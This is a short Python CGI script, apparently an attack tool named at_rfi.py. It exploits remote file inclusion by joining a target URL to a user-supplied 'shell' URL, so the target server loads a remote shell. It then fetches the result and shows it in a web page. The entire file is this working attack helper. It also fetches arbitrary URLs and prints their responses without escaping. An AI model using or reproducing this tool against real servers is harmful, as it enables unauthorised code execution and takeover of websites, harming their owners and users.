#!/usr/bin/python 
 
#Tumi (c) 2013 at_rfi.py

import httplib2 
import urllib2 
import re 
import cgi
import cgitb
cgitb.enable()

# GET
form   = cgi.FieldStorage()
url = form.getvalue("url")
script = form.getvalue("shell")

# HTML HEADERS
print "Content-Type: text/html; charset=UTF-8"	# Print headers
print ""

# HTML 

print '''
<html>
<body>
'''

if 'http://' not in url:  
    url = 'http://' + url 
rfi = url+script

req = urllib2.urlopen(rfi) 
rpta = req.read()

print "<textarea style=\"margin: 2px; height: 360px; width: 420px; color: white; background-color: transparent; \">" + rpta + "</textarea>"

'''
</body>
-</html>
'''
